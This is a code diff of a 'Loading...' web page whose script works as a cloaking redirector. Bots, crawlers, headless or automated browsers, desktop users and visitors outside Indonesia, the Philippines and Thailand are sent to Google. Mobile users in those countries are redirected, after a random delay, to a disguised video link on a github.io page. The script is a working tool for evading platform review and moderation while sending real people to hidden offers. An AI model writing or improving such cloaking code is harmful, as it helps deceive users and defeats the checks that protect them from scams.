@@ -4,49 +4,77 @@
 <meta charset="UTF-8">
 <title>Loading...</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="referrer" content="no-referrer">
 </head>
-<body style="background:black;color:white;text-align:center;padding-top:40vh">
 
-Loading...
+<body style="background:black;color:white;text-align:center;padding-top:40vh;font-family:sans-serif">
+Please wait...
 
 <script>
-// ================= CONFIG =================
-const links = {
-  a1: {
-    money: "https://offer-money-link.com",
-    safe: "https://google.com"
-  },
-  b2: {
-    money: "https://another-offer.com",
-    safe: "https://cdn.videy.co/8scghHD91.mp4"
+const CONFIG = {
+  allowedCountries: ["ID", "PH", "TH"],
+  mobileOnly: true,
+  delayMin: 800,
+  delayMax: 1800,
+
+  offers: {
+    a1: {
+      money: [
+        "https://pid-watch-tv.github.io/8scghHD91.mp4",
+        "https://pid-watch-tv.github.io/8scghHD91.mp4",
+        "https://pid-watch-tv.github.io/8scghHD91.mp4"
+      ],
+      safe: "https://google.com"
+    }
   }
 };
 
-const allowedReferrer = ["tiktok", "facebook", "instagram"];
-const delay = 1200; // ms
-// =========================================
+const qs = new URLSearchParams(location.search);
+const id = qs.get("id");
 
-// GET PARAM
-const params = new URLSearchParams(window.location.search);
-const id = params.get("id");
-
-// BASIC CHECKS
 const ua = navigator.userAgent.toLowerCase();
-const ref = document.referrer.toLowerCase();
+const isMobile = /android|iphone|ipad|ipod/i.test(ua);
+const isBotUA = /bot|crawl|spider|headless|preview|wget|curl/i.test(ua);
+const isWebdriver = navigator.webdriver === true;
 
-const isMobile = /android|iphone|ipad/i.test(ua);
-const isAllowedRef = allowedReferrer.some(r => ref.includes(r));
+const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+const pick = arr => arr[Math.floor(Math.random() * arr.length)];
 
-let target = links[id]?.safe || "https://google.com";
-
-if (isMobile && isAllowedRef && links[id]) {
-  target = links[id].money;
+async function getCountry() {
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    const j = await r.json();
+    return j.country || "";
+  } catch {
+    return "";
+  }
 }
 
-// REDIRECT
-setTimeout(() => {
-  window.location.href = target;
-}, delay);
+(async () => {
+  if (!CONFIG.offers[id]) {
+    location.href = "https://google.com";
+    return;
+  }
+
+  if (isBotUA || isWebdriver) {
+    location.href = CONFIG.offers[id].safe;
+    return;
+  }
+
+  if (CONFIG.mobileOnly && !isMobile) {
+    location.href = CONFIG.offers[id].safe;
+    return;
+  }
+
+  const country = await getCountry();
+  if (CONFIG.allowedCountries.length && !CONFIG.allowedCountries.includes(country)) {
+    location.href = CONFIG.offers[id].safe;
+    return;
+  }
+
+  const target = pick(CONFIG.offers[id].money);
+  setTimeout(() => location.replace(target), rand(CONFIG.delayMin, CONFIG.delayMax));
+})();
 </script>
 
 </body>
